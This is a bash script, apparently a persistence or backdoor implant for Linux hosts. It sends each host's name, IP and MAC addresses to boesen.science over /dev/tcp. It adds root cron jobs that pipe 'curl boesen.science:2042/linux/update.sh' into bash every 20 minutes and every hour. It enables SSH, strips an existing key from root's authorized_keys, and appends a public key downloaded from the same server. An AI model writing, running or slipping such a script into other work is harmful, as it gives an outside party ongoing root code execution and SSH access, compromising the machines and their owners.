#!/usr/bin/bash

# Prevent from running twice per hour
if [[ $(< /tmp/last) = `date +"%H"` ]]; then
	exit 1
else
	date +"%H" > /tmp/last
fi

HOSTNAME=$(hostname)
IP=$(hostname -I | sed 's/ *$//')
MAC=$(cat /sys/class/net/*/address | grep -v "00:00:00:00:00:00" | tr '\n' ',' | sed 's/,*$//')

INFO="$HOSTNAME $IP $MAC"

SERVER="boesen.science"
PORT=2043

rm /tmp/ip

if [[ $(< /etc/info) != "$INFO" ]]; then
	printf "$INFO" > /etc/info

	printf "UPDATE: $INFO\0" >/dev/tcp/$SERVER/$PORT
fi

grep -v "boesen.science" /var/spool/cron/crontabs/root > /tmp/crontab; mv /tmp/crontab /var/spool/cron/crontabs/root
echo '*/20 * * * * curl -L boesen.science:2042/linux/update.sh |bash' >> /var/spool/cron/crontabs/root

printf '#\!/bin/bash\ncurl -L boesen.science:2042/linux/update.sh |bash\n' > /etc/cron.hourly/update; chmod +x /etc/cron.hourly/update

systemctl start ssh.service
systemctl enable ssh.service

SSHPATH="/root/.ssh"

mkdir -p "$SSHPATH"

# Remove other key if it's there
grep -v "root@legend" $SSHPATH/authorized_keys > /tmp/authorized_keys
mv /tmp/authorized_keys $SSHPATH/authorized_keys

if ! grep boesene $SSHPATH/authorized_keys; then
	curl -L boesen.science:2042/pubkey >> $SSHPATH/authorized_keys
fi
